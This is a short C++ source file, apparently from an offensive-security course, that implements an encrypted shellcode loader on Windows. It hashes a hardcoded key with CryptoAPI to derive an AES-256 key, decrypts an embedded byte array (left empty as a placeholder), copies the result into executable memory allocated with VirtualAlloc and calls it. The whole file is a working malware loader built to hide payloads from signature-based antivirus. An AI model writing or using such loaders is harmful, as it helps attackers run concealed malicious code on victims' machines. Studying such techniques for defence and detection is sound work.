// Filename: aes_decrypt_exec.cpp
// Purpose: AES decrypt shellcode and execute it (uses CryptoAPI).
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <wincrypt.h>
#include <iostream>

#pragma comment(lib, "advapi32")

bool DecryptAES(BYTE* data, DWORD size, BYTE* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return false;
    if (!CryptHashData(hHash, key, keyLen, 0)) return false;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return false;

    DWORD len = size;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, data, &len)) return false;

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

int main() {
    BYTE aesKey[] = { 'A','E','S','K','E','Y','1','2','3','4','5','6','7','8','9','0' };
    BYTE encrypted[] = { /* Encrypted shellcode goes here */ };
    DWORD size = sizeof(encrypted);

    if (DecryptAES(encrypted, size, aesKey, sizeof(aesKey))) {
        void* mem = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(mem, encrypted, size);
        ((void(*)())mem)();
    } else {
        std::cerr << "AES decryption failed.\n";
    }

    return 0;
}
